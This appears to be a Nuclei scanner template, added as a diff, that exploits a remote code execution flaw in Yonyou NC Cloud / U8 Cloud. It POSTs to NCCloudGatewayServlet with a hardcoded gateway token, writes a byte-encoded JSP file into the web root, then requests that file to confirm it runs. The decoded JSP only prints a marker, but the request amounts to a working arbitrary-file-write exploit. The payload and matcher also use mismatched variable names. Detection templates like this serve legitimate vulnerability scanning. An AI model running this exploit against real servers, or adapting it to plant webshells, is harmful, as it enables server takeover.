@@ -1,0 +1,82 @@
+id: yongyou-ncloud-NCCloudGatewayServlet-rce
+
+info:
+  name: yongyou-ncloud-NCCloudGatewayServlet-rce
+  author: PokerSec
+  severity: critical
+  description: yongyou-ncloud-NCCloudGatewayServlet-rce
+  tags: yonyou,u8cloud,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/service/NCCloudGatewayServlet"
+
+    headers:
+      Host: "{{Hostname}}"
+      Accept: "*/*"
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      gatewaytoken: "TJ6RT-3FVCB-DPYP8-XF7QM-96FV3"
+
+    body: |
+      {
+        "groupCode": "1002",
+        "user": "1002",
+        "serviceInfo": {
+          "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
+          "serviceMethodName": "writeDocToXMLFile",
+          "serviceMethodArgInfo": [
+            {
+              "argType": {
+                "body": "java.lang.Byte"
+              },
+              "argValue": {
+                "body": [60,37,32,111,117,116,46,112,114,105,110,116,108,110,40,34,89,79,78,89,79,85,95,82,67,69,95,86,85,76,78,95,123,123,114,97,110,100,111,109,95,115,116,114,125,125,34,41,59,32,37,62]
+              },
+              "agg": false,
+              "isArray": true,
+              "isPrimitive": true
+            },
+            {
+              "argType": {
+                "body": "java.lang.String"
+              },
+              "argValue": {
+                "body": "./webapps/u8c_web/{{randstr}}.jsp"
+              },
+              "agg": false,
+              "isArray": false,
+              "isPrimitive": false
+            }
+          ]
+        }
+      }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "retObj")'
+          - 'contains(body, "path")'
+          - 'contains(body, "File")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: jsp_filename
+        part: body
+        group: 1
+        regex:
+          - '"path":"\\.\\\\webapps\\\\u8c_web\\\\([^"]+)\\.jsp"'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/u8c_web/{{randstr}}.jsp"
+      - "{{BaseURL}}/u8c_web/{{jsp_filename}}.jsp"
+
+    matchers:
+      - type: word
+        words:
+          - "YONYOU_RCE_VULN_{{randstr}}"
+        condition: and
